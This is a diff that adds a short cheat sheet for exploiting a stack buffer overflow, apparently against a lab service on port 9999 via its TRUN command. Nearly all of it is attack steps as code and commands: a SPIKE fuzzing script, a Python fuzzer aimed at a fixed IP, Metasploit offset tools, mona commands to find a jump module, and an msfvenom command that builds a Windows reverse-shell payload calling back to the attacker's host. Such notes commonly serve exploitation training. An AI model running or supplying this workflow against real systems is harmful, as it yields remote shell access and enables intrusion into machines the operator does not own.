@@ -1,0 +1,44 @@
+1) SPIKING
+USE generic_send_tcp
+
+CREATE spike_script:
+s_readline();
+s_string("STAT ");
+s_string_variable("0");
+-------------------------------------------------------------------------------------------------------------------------------------------------------------------
+2) FUZZING
+#!/usr/bin/python
+ 
+import sys, socket
+from time import sleep
+ 
+buffer = "A" * 100
+ 
+while True:
+    try:
+        payload = "TRUN /.:/" + buffer
+ 
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.connect(('192.168.1.35',9999))
+        print ("[+] Sending the payload...\n" + str(len(buffer)))
+        s.send((payload.encode()))
+        s.close()
+        sleep(1)
+        buffer = buffer + "A"*100
+    except:
+        print ("The fuzzing crashed at %s bytes" % str(len(buffer)))
+        sys.exit()
+-------------------------------------------------------------------------------------------------------------------------------------------------------------------
+3) FINDING THE OFFSET
+pattern_create.rb -l [crash application number]
+pattern_offset.rb -l [crash application number] -q [EIP]
+-------------------------------------------------------------------------------------------------------------------------------------------------------------------
+4) FIND BAD CHARACTERS:
+https://github.com/cytopia/badchars
+-------------------------------------------------------------------------------------------------------------------------------------------------------------------
+5) FIND RIGHT MODULE:
+!mona modules
+!mona find -s "\xff\xe4" -m [module]
+-------------------------------------------------------------------------------------------------------------------------------------------------------------------
+6) CREATE PAYLOAD:
+msfvenom -p windows/shell_reverse_tcp LHOST=[local ip] LPORT=[local port] EXITFUNC=thread -f c -a x86 -b "\00\bad_characters"
